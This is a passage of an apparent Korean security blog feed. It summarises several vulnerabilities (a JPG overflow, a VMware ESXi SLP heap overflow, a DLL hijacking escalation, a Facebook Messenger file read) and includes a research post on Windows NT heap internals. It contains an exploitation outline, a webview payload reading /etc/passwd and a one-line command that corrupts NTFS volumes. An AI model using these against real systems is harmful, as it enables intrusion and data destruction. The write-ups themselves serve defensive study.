class="hljs-number">0xfff</span>;&#125;*raster_buffer = (<span class="hljs-keyword">short</span>)short_1;      ...raster_buffer = raster_buffer + <span class="hljs-number">3</span>;width = width + <span class="hljs-number">-1</span>;&#125; <span class="hljs-keyword">while</span> (width != <span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">return</span>;&#125;</code></pre><p>취약점이 발생하는 함수는 <code>width</code>의 크기만큼 반복문을 돌며 <code>raster_buffer</code>에 복사합니다. <code>width</code>는 JPG 파일의 헤더 요소인 SOF(Start Of Frame, JPG 파일의 크기 및 샘플링 정보) 마커에서 가져오는데, <code>raster_buffer</code>와 <code>width</code>의 크기 검사를 하지 않습니다. 따라서 해커가 SOF 마커를 조작해 <code>raster_buffer</code>의 크기가 SOF 마커에서 파싱 한 <code>width</code>에 3을 곱한 값보다 작으면 buffer overflow로 인해 범위를 벗어난 쓰기가 가능하며 원격 코드 실행으로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
      <tag>oob</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SLP heap overflow를 통한 VMware ESXi pre-auth RCE 취약점</title>
    <link href="/2021/03/04/idioth/2021-03-04/"/>
    <url>/2021/03/04/idioth/2021-03-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.thezdi.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi">CVE-2020-3992 &amp; CVE-2021-21974: PRE-AUTH REMOTE CODE EXECUTION IN VMWARE ESXI</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware ESXi<ul><li>7.0 before ESXi70U1c-17325551</li><li>6.7 before ESXi670-202102401-SG</li><li>6.5 before ESXi650-202102101-SG</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware ESXi에서 pre-authentication remote code execution 취약점이 발견되었습니다. 해당 취약점은 Service Location Protocol(SLP) 서비스에서 발생합니다.</p><p>Service Location Protocol(SLP)는 VMware ESXi 기본 설치 시 TCP와 UDP의 427 포트를 리스닝하는 네트워크 서비스입니다. VMware는 OpenSLP 1.0.1을 기반으로 기능을 추가하여 서비스를 구현하였습니다. 이 서비스는 인증 없이 네트워크 input을 구문 분석하고 root 권한으로 실행하므로 ESXi SLP 서비스의 취약점을 통해 pre-auth remote code execution이 가능합니다.</p><p>VMware의 SLP 코드의 일부분은 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">SLPParseSrvUrl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> srvurllen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *srvurl, _QWORD *a3)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-comment">// ...</span>  obuf = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1u</span>LL, srvurllen + <span class="hljs-number">53L</span>L);  <span class="hljs-keyword">if</span> ( !obuf )    <span class="hljs-keyword">return</span> <span class="hljs-number">12L</span>L;  v6 = <span class="hljs-built_in">strstr</span>(srvurl, <span class="hljs-string">&quot;:/&quot;</span>);        <span class="hljs-comment">// &lt;-- out-of-bounds string search</span>  <span class="hljs-keyword">if</span> ( !v6 )  &#123;    <span class="hljs-built_in">free</span>(obuf);    <span class="hljs-keyword">return</span> <span class="hljs-number">22L</span>L;  &#125;  <span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">char</span> *)obuf + <span class="hljs-number">41</span>, srvurl, v6 - srvurl);  <span class="hljs-comment">// &lt;-- heap overflow</span><span class="hljs-comment">// ...</span>&#125;</code></pre><p><code>srvurl</code>은 네트워크 input을 통해 받는 값이지만 함수에서 <code>strstr()</code>을 사용하기 전에 <code>srvurl</code>의 끝에 NULL 바이트를 추가하지 않습니다. 따라서 범위 밖의 문자열을 검사하여 <code>memcpy</code> 부분에서 heap overflow가 발생합니다.</p><p>SLP를 통해 Remote Code Execution을 하기 위해 SLP에서 송수신에 사용되는 <code>struct SLPBuffer</code>의 구조는 다음과 같습니다.</p><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPBuffer</span></span><span class="hljs-class">&#123;</span>    SLPListItem listitem;    <span class="hljs-keyword">size_t</span>  allocated;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   start;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   curpos;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*   <span class="hljs-built_in">end</span>;    <span class="hljs-comment">// buffer data is appended</span>&#125;*SLPBuffer;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SLPDSocket</span></span><span class="hljs-class">&#123;</span>    SLPListItem         listitem;    <span class="hljs-keyword">int</span>                 fd;    <span class="hljs-keyword">time_t</span>              age;    <span class="hljs-keyword">int</span>                 state;<span class="hljs-comment">// ...</span>    SLPBuffer           recvbuf; <span class="hljs-comment">/* Incoming socket stuff */</span>    SLPBuffer           sendbuf;<span class="hljs-comment">// ...</span>&#125;SLPDSocket;</code></pre><p>VMware의 SLP 코드를 통해 Remote Code execution을 트리거하는 과정은 다음과 같습니다.</p><ol><li><code>connection-&gt;state</code>를 <code>STREAM_WRITE_FIRST</code>로 덮어씁니다. 메모리를 leak 하기 위해 <code>sendbuf-&gt;curpos</code>를 <code>sendbuf-&gt;start</code>로 리셋시켜야 합니다.</li><li><code>sendbuf-&gt;start</code>의 일부분을 2개의 널 바이트로 덮어씁니다. 연결 후 수신을 기다리면, <code>sendbuf</code>의 주소를 포함한 메모리를 leak 할 수 있습니다.</li><li><code>mmap()</code>으로 할당된 <code>recvbuf</code>를 leak 하기 위해 새로운 연결을 하고 <code>sendbuf-&gt;curpos</code>를 덮어씁니다. mmap 된 주소를 통해 libc base 주소를 얻을 수 있습니다.</li><li><code>free_hook</code>의 주소를 설정하기 위해 새로운 연결에서 <code>recvbuf-&gt;curpos</code>를 덮어씁니다. 연결 후 전송이 시작되면 <code>free_hook</code>을 덮어쓸 수 있습니다.</li><li>접속을 종료하면 <code>free_hook</code>이 호출되어 ROP 체인이 시작됩니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>vmware</tag>
      
      <tag>heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SrClient DLL hijacking</title>
    <link href="/2021/03/03/fabu1ous/2021-03-03/"/>
    <url>/2021/03/03/fabu1ous/2021-03-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.vonahi.io/srclient-dll-hijacking/">SrClient DLL Hijacking</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Server 2012</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Server 2012 R2를 제외한 모든 Windows Server 2012에서 악용할 수 있는 DLL hijacking을 통한 권한 상승 취약점이 발견되었습니다. Windows Module Installer Service의 <code>TiWork.exe</code>가 Windows search order에 의거하여 존재하지 않는 리소스(<code>SrClient.dll</code>)의 로드를 시도합니다. <code>TiWork.exe</code>는 NT AUTHORITY\SYSTEM 권한으로 실행되기 때문에 <code>SrClient.dll</code>을 hijacking 하는 것으로 권한 상승을 할 수 있습니다.</p><p>프로세스가 로드하고자 하는 DLL의 절대 주소 혹은 정확한 주소를 지정하지 않으면 Windows는 DLL search order에 따라 해당 DLL 위치를 검색합니다.</p><ol><li>프로세스가 지정한 주소</li><li>System 디렉터리 (<code>system32</code>, <code>systemWOW64</code>)</li><li>Windows 디렉터리 (<code>C:\Windows\</code>)</li><li>현재 디렉터리</li><li><code>%PATH%</code>환경 변수에 등록된 디렉터리</li></ol><p>Third-party App에 의해 부적절한 접근 권한이 설정된 디렉터리가 <code>%PATH%</code> 환경 변수 값으로 등록되어 있다면 <code>SrClient.dll</code>를 hijacking 할 수 있습니다. Windows의 업데이트 체크를 통해  <code>TiWork.exe</code>의 실행을 트리거할 수 있고 유저 권한에서 System 권한으로 상승할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>windows server</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Facebook Messenger 데스크톱 앱의 임의 파일 읽기 취약점</title>
    <link href="/2021/03/02/l0ch/2021-03-02/"/>
    <url>/2021/03/02/l0ch/2021-03-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d">Facebook Messenger Desktop App Arbitrary File Read</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook Messenger for Desktop</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>페이스북 메신저의 데스크톱 버전 앱에서 arbitrary file read 취약점이 발견되었습니다.</p><p>페이스북 메신저는 Electron을 사용하며 <code>webviewTag</code> 가 활성화되어있습니다. <code>webview</code> 태그는 로컬 파일을 로드하는 기능이 존재해 해커가 <code>&lt;webview src=&quot;file:[file location]&quot;&gt;&lt;/webview&gt;</code> 내용이 포함된 링크를 전송하면 타깃의 임의의 로컬 파일을 읽을 수 있습니다.</p><p>취약점을 통해 <code>/etc/passwd</code> 파일을 읽는 과정은 다음과 같습니다.</p><ol><li>해커가 임의의 타깃에게 <code>webview</code> 가 포함된 악성 링크를 보냅니다.</li><li>타깃은 스팸 섹션을 열고 링크를 클릭합니다.</li><li>Facebook Messenger는 악성 링크에 포함된 <code>&lt;webview&gt; src=&quot;file:///etc/passwd&quot;&gt;&lt;/webview&gt;</code> 를 사용하여 <code>/etc/passwd</code> 파일을 로드합니다.</li><li><code>webview.executeJavaScript()</code>로 로드한 파일의 데이터를 읽어옵니다.</li></ol><p>Facebook은 해당 취약점 보고서에 2000$의 보상을 지급했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>facebook</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft fixes Windows 10 drive corruption bug</title>
    <link href="/2021/03/01/idioth/2021-03-01/"/>
    <url>/2021/03/01/idioth/2021-03-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-windows-10-drive-corruption-bug-what-you-need-to-know/">Microsoft fixes Windows 10 drive corruption bug — what you need to know</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows XP</li><li>Windows 10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>아직 메인 업데이트에 패치되지 않은 버그입니다.</p></blockquote><p>Microsoft에서 특정 경로에 접근하거나 조작된 파일을 보는 것만으로 NTFS 볼륨이 손상될 수 있는 Windows 10 버그를 수정했습니다.</p><p>해당 버그는 낮은 권한에서도 한 줄의 명령어(<code>cd c:\\$i30:bitmap</code>)만으로 트리거 됩니다. 명령 프롬프트에서 해당 명령을 실행하면 “파일 또는 디렉터리가 손상되어 읽을 수 없습니다.” 오류 메시지가 출력된 후 PC를 재시작하여 손상된 디스크 볼륨을 복구하라는 알람이 표시됩니다.</p><p><code>$i30</code> NTFS 인덱스 엔트리로 디렉터리 파일 및 하위 폴더 목록을 포함하는 디렉터리와 관련된 NTFS 속성입니다. 이 속성에 접근할 때 드라이브가 손상되는 이유는 블루스크린에 대한 레지스트리 키가 작동하지 않아 정확하게 알 수 없습니다.</p><p>또한 명령어를 입력하는 것뿐만 아니라 바로가기 경로가 <code>C:\\$i30:bitmap</code>인 파일을 보는 것만으로도 해당 버그가 발생하여 NTFS 볼륨이 손상될 수 있습니다. 이를 통해 ZIP 파일 내부에 <code>C:\\$i30:bitmap</code> 바로가기가 존재하는 압축 파일을 통해 버그를 악용할 수 있습니다.</p><p>Microsoft는 Windows Insider 빌드 21322 릴리스와 함께 해당 경로에 접근하려고 하면 “지정된 경로를 찾을 수 없습니다.”를 출력하게 수정하였습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/">https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/</a></p><p><a href="https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/">https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>ntfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</title>
    <link href="/2021/02/28/l0ch/pwncoolsexy-part2/"/>
    <url>/2021/02/28/l0ch/pwncoolsexy-part2/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! L0ch입니다. 오늘은 이전 글에서 예고한 대로 NT heap의 Low Fragmentation Heap에 대해 쓰려고 했지만..  Windows Heap에 대한 전반적인 정리와 같이 쓰는 것이 좋을 것 같아 Windows Heap으로 주제를 확장해봤습니다. 그래서! 오늘은 WIndows가 Heap을 어떻게 관리하는지 하나씩 뜯어보면서 살펴보도록 할게요!</p><h1 id="Windows-Heap"><a href="#Windows-Heap" class="headerlink" title="Windows Heap"></a>Windows Heap</h1><p>윈도우의 Heap 할당 메커니즘은 NT Heap과 Windows 10에서 추가된 Segment Heap 두 가지가 존재합니다. NT Heap은 Windows의 기본 memory allocator이며 Segment Heap은 최근에 도입된 만큼 더 효율적인 memory allocator입니다.</p><p>여담으로 Segment Heap은 도입 초기에는 일부 시스템 프로세스, MS 엣지 브라우저, UWP(Universal Windows Platform) 앱 등에서만 사용하고 있었으나 2020년 5월 업데이트 (버전 2004, 빌드 19041)로 일반적인 Win32 어플리케이션도 사용할 수 있게 되었다고 합니다.. 만 아직은 일반적인 어플리케이션에서는 NT Heap을 사용하는 추세죠. 메모리 잡아먹는 하마 크롬도 Segment Heap을 적용한 패치 이후 메모리 사용량은 줄였지만 성능 저하도 같이 나타나서 다시 비활성화했다고 하네요..ㅋㅋ</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%201.png"></p><p>Segment Heap에 대해서는 다음에 다뤄보도록 하고, 이번 글에서는 NT Heap에 대해 정리해보겠습니다. </p><h1 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT Heap"></a>NT Heap</h1><p>NT Heap에 대한 Overview부터 짚고 넘어가 볼까요?</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%202.png"></p><p>위 사진은 일반적인 <code>malloc()</code>과 <code>free()</code>를 사용해 Heap을 할당할 때의 내부 할당 프로세스입니다. </p><p>NT Heap은 크게 Front-End와 Back-End로 나눠지며 Front-End가 이후에 설명할 Low Fragmentation Heap(LFH)을 의미합니다. LFH가 비활성화되어 있다면 Heap 메모리 할당 시 Front-End를 건너뛰고 바로 Back-End로 넘어갑니다.</p><h1 id="Low-Fragmentation-Heap"><a href="#Low-Fragmentation-Heap" class="headerlink" title="Low Fragmentation Heap"></a>Low Fragmentation Heap</h1><p>Heap Fragmentation(단편화)은 반복되는 할당과 해제 이후 가용 메모리가 작고 불연속적으로 나뉜 상태를 말합니다. 이러한 단편화가 발생하면 가용 메모리보다 작은 크기에 대해 할당을 요청해도 연속적인 메모리 구간 확보가 되지 않아 메모리 할당 요청이 실패할 수 있습니다.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%203.png"></p><blockquote><p>단편화로 인해 가용 메모리가 충분한데도 할당이 실패할 수 있다.</p></blockquote><p>초기 윈도우에서도 이런 단편화 이슈가 존재했으며 MS는 이런 단편화 이슈를 해결하기 위해 LFH를 도입했고 vista부터 시스템에서 자동으로 설정되면서 본격적으로 사용되기 시작했습니다.</p><p>LFH는 동일한 크기의 Heap 메모리를 여러 번 할당하다 보면 자동으로 활성화됩니다. 간단한 테스트 코드로 어느 시점에서 LFH가 활성화되는지 볼까요?</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x300</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">int</span> i;    LPVOID chunk;    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-keyword">int</span> prev_chunk = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) &#123;        chunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Chunk 0x%p   &quot;</span>, i, chunk);        <span class="hljs-keyword">if</span> (i != <span class="hljs-number">0</span>)            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;offset : %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)chunk - prev_chunk);        <span class="hljs-keyword">else</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);        prev_chunk = (<span class="hljs-keyword">int</span>)chunk;    &#125;    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><img src="Untitled 4.png" height="550px" width="500px" ></p><p>동일한 크기의 Heap을 연속적으로 할당했을 때의 결과입니다. </p><ul><li>인덱스 0과 1을 제외한 인덱스 16까지의 chunk 사이 거리가 일정함</li><li>인덱스 17부터 chunk 간 거리가 일정하지 않음</li></ul><p>메모리 상황에 따라 조금씩의 차이는 있지만 대부분 이러한 특성을 가지고 있습니다.</p><p>chunk가 LFH에 의해 관리되고 있는지는 Windbg에서 다음 명령어로 확인할 수 있습니다.</p><pre><code class="hljs bash">!hepa -x [Chunk Address]</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%205.png"></p><p>위 사진에서 인덱스 0 ~ 16 사이 일정한 거리로 할당되는 chunk들은 LFH로 관리되지 않고, 인덱스 17부터 무작위의 거리를 갖는 chunk는 LFH로 관리되고 있음을 확인할 수 있습니다. </p><p>여기서 LFH의 특징 한 가지를 알 수 있습니다!</p><blockquote><p>LFH가 활성화되면 Heap Chunk 간 거리가 무작위로 할당된다.</p></blockquote><p>이는 Windows에서 Exploit을 진행할 때 Heap을 원하는 대로 세팅하는 Heap Grooming을 더 어렵게 만들어 reliable 한 exploit 제작을 어렵게 합니다. </p><ul><li>16KB(0x4000) 보다 큰 Heap을 할당할 경우에는 LFH가 관리하지 않습니다.</li></ul><h1 id="NT-Heap-Analysis"><a href="#NT-Heap-Analysis" class="headerlink" title="NT Heap Analysis"></a>NT Heap Analysis</h1><p>이제 NT Heap을 본격적으로 분석해보겠습니다! 우선 Heap 관리에 사용되는 구조체와 역할에 대해 정리하겠습니다.</p><h2 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h2><p>memory allocator의 핵심 구조체로, 전체 Heap을 관리할 때 쓰입니다. 굳이 분류하자면 NT Heap보다 상위의 구조체로 프로세스에 할당된 Heap의 시작에 위치하는 구조체입니다.</p><p>동일한 테스트 코드를 실행한 뒤 Windbg에서 직접 확인해볼게요. </p><p><img src="Untitled 6.png" height="560px" width="500px" ></p><p>프로세스의 Heap List는 PEB의 <code>ProcessHeaps</code> 필드에 위치합니다. <code>dt _PEB @$peb</code> 명령어로 모든 PEB 필드 값을 출력할 수 있습니다. </p><pre><code class="hljs text">0:001&gt; dt _PEB @$pebntdll!_PEB   +0x000 InheritedAddressSpace : 0 &#x27;&#x27;   +0x001 ReadImageFileExecOptions : 0 &#x27;&#x27;   +0x002 BeingDebugged    : 0x1 &#x27;&#x27;   +0x003 BitField         : 0x4 &#x27;&#x27;   +0x003 ImageUsesLargePages : 0y0   +0x003 IsProtectedProcess : 0y0   +0x003 IsImageDynamicallyRelocated : 0y1   +0x003 SkipPatchingUser32Forwarders : 0y0   +0x003 IsPackagedProcess : 0y0   +0x003 IsAppContainer   : 0y0   +0x003 IsProtectedProcessLight : 0y0   +0x003 IsLongPathAwareProcess : 0y0   +0x004 Padding0         : [4]  &quot;&quot;   +0x008 Mutant           : 0xffffffff`ffffffff Void   +0x010 ImageBaseAddress : 0x00007ff6`c6c30000 Void   +0x018 Ldr              : 0x00007ff9`905b94c0 _PEB_LDR_DATA   +0x020 ProcessParameters : 0x000001cd`c8f922e0 _RTL_USER_PROCESS_PARAMETERS   +0x028 SubSystemData    : (null)    +0x030 ProcessHeap      : 0x000001cd`c8f90000 Void...</code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%207.png"></p><p>너무 많으니 우리가 찾으려는 필드명으로 검색해보죠</p><pre><code class="hljs c">?? ((_PEB*) @$peb)-&gt;ProcessHeaps <span class="hljs-comment">// PEB-&gt;ProcessHeaps 필드값 출력</span></code></pre><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%208.png"></p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%209.png"></p><p><code>ProcessHeaps</code> 는 <code>_Heap</code> 구조체를 가리키는 포인터 배열을 가리킵니다. 포인터 배열에는 Heap 주소들이 나열되어 있네요. </p><p>첫 번째 구조체를 확인해볼게요. <code>_HEAP</code> 은  <code>dt _HEAP [Address]</code> 로 확인할 수 있습니다.</p><pre><code class="hljs text">0:001&gt; dt _HEAP 000001cd`c8f90000ntdll!_HEAP   +0x000 Segment          : _HEAP_SEGMENT   +0x000 Entry            : _HEAP_ENTRY   +0x010 SegmentSignature : 0xffeeffee   +0x014 SegmentFlags     : 2   +0x018 SegmentListEntry : _LIST_ENTRY [ 0x000001cd`c8f90120 - 0x000001cd`c8f90120 ]...   +0x07c EncodeFlagMask   : 0x100000   +0x080 Encoding         : _HEAP_ENTRY   +0x090 Interceptor      : 0...   +0x138 BlocksIndex      : 0x000001cd`c8f902e8 Void   +0x140 UCRIndex         : (null)    +0x148 PseudoTagEntries : (null)    +0x150 FreeLists        : _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]...   +0x198 FrontEndHeap     : 0x000001cd`c8f20000 Void   +0x1a0 FrontHeapLockCount : 0   +0x1a2 FrontEndHeapType : 0x2 &#x27;&#x27;   +0x1a3 RequestedFrontEndHeapType : 0x2 &#x27;&#x27;   +0x1a8 FrontEndHeapUsageData : 0x000001cd`c8f98210  &quot;&quot;   +0x1b0 FrontEndHeapMaximumIndex : 0x402   +0x1b2 FrontEndHeapStatusBitmap : [129]  &quot;x&quot;   +0x238 Counters         : _HEAP_COUNTERS   +0x2b0 TuningParameters : _HEAP_TUNING_PARAMETERS</code></pre><ul><li>0x7c EncodeFlagMask : Heap chunk header가 인코딩 되었는지를 나타내는 필드. 처음 Heap을 초기화할 때 <code>0x100000</code>으로 설정됨</li><li>0x080 Encoding : Heap header의 변조를 방지하기 위해 XOR 인코딩을 할 때 사용됨</li><li>0x138 BlocksIndex : <code>_HEAP_LIST_LOOKUP</code> 구조체를 가리킴  <code>_HEAP_LIST_LOOKUP</code> 구조체는 Back-End에서 Heap chunk들을 관리하기 위해 사용됨</li><li>0x150 FreeLists : 할당 해제된 Heap Chunk들의 <code>_HEAP_ENTRY</code> 구조체를 가리킴</li><li>0x198 FrontEndHeap : LFH가 활성화된 경우 할당된 <code>_LFH_HEAP</code> 구조체를 가리킴</li><li>0x1a2 FrontEndHeapType : LFH 활성화 여부를 나타내며 <code>0x0</code> 이면 비활성화, <code>0x2</code>면 활성화된 상태. <code>HeapQueryInformaton()</code> 함수를 통해 LFH 활성화 여부를 구별할 때 사용됨</li><li>0x1a8 FrontEndHeapUsageData : 할당되는 Chunk의 수를 기록하며 일정 수준에 도달하면 Front-End(LFH)를 활성화</li></ul><p><code>FrontEndHeap</code>에 유효한 주소 값이 있고 <code>FrontEndHeapType</code> 값이 <code>0x2</code>인걸로 LFH가 활성화되어 Heap 메모리들을 관리하는 것을 확인할 수 있습니다.</p><h2 id="Back-End-Structure"><a href="#Back-End-Structure" class="headerlink" title="Back-End Structure"></a>Back-End Structure</h2><p>실질적인 Heap의 할당 및 해제를 관리하는 NT Heap의 Back-End 구조체입니다.</p><h3 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p>할당된 HEAP Chunk의 header 구조체입니다. 앞서 <code>_HEAP</code>의 <code>Encoding</code> 필드 설명대로 header의 변조를 방지하기 위해 XOR 인코딩을 하기 때문에 디코딩 과정을 거쳐야 확인할 수 있습니다.</p><p>LFH로 관리되는지 아닌지에 따라 XOR 인코딩 방식이 다르며 직접 디코딩해보면서 <code>_HEAP_ENTRY</code> 값을 확인해보겠습니다.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2010.png"></p><p>LFH가 활성화되지 않은 인덱스 0의 Chunk header는 <code>_Heap</code>의 Encode 필드와 XOR 연산으로 인코딩 됩니다. 이 두 값을 XOR 한 결과로 <code>chunk+0x10</code>(16 bytes 단위이므로 0x18을 수정)을 수정하면 아래와 같이 디코딩된 <code>_HEAP_ENTRY</code>를 확인할 수 있습니다.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2011.png"></p><h3 id="FreeLists-HEAP-ENTRY"><a href="#FreeLists-HEAP-ENTRY" class="headerlink" title="FreeLists(_HEAP_ENTRY)"></a>FreeLists(_HEAP_ENTRY)</h3><p>chunk가 해제되면 size에 따라 FreeList에 배치됩니다. </p><p>FreeLists의 구조는 glibc의 unstored bin과 유사하며 해제된 chunk의 <code>_HEAP_ENTRY</code> 를 가리킵니다. </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2012.png"></p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))(*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))                 [Type: _LIST_ENTRY]    [+0x000] Flink            : 0x1cdc8f95e10 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fab880)((ntdll!_LIST_ENTRY *)0x1cdc8fab880)                 : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f90150 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)                 : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)                 : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)                 : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)                 : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f93100 [Type: _LIST_ENTRY *]</code></pre><h3 id="HEAP-LIST-LOOKUP"><a 